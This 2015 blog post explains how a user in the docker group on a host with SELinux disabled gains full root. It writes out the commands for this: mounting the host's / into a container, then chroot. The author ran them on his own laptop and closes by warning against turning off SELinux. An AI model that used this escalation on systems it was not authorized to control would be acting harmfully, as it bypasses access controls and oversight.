---
title: Root your host in 2 easy steps with Docker

date: 2015-05-09T03:37:49+00:00
url: /index.php/root-your-host-in-2-easy-steps-with-docker/
al2fb_facebook_link_id:
  - 55700847_10102032281813308
al2fb_facebook_link_time:
  - 2015-05-09T03:37:55+00:00
al2fb_facebook_link_picture:
  - media=https://jmainguy.com/?al2fb_image=1
categories:
  - General

---
So lets assume jmainguy is a user on your system, and he asks to be added to the docker group so he can spin up docker containers and such, seems like a fairly reasonable request. You add him to the docker group.

jmainguy then complains that he cant share data among-st his containers via -v volume mounting, selinux is stopping him. He wanted to mount some gluster storage shared between the containers, a fairly reasonable request. For some reason you turn off selinux so he can volume mount. (dont turn off selinux).

You have now given jmainguy root to the box.

I did not feel like becoming root on my laptop, so I updated it via the following as my jmainguy user in the docker group.

```bash
docker run -v /:/home -ti fedora /bin/bash
```

#This mounted / from the host, to /home on the container, and then dropped jmainguy into the container running bash (as root on the container).

As root, I ran:

```bash
chroot /home
```

This makes the shell act like `/` starts at `/home`.

Then because I hate `/bin/sh`, I ran:

```bash
/bin/bash
```

Hooray, I am full root on my laptop and can do as I please. Thankfully I just wanted to upgrade it

```bash
dnf upgrade
```

And as root on the container looking at dnf history, it shows this.

```text
[root@Jmainguy-Fedora jmainguy]# dnf history
Last metadata expiration check performed 2:03:46 ago on Fri May 8 20:56:52 2015.

ID | Login user          | Date             | Action  | Altered
27 | System <unset>      | 2015-05-08 22:59 | Update  | 83
26 | Jonathan <jmainguy> | 2015-05-05 16:10 | Update  | 6
25 | Jonathan <jmainguy> | 2015-05-04 08:48 | E, I, U | 131 EE
```

As you can see, ID2 27, the user was &#8220;System <unset>&#8221; and updated 83 packages.

tldr; Do not turn off selinux
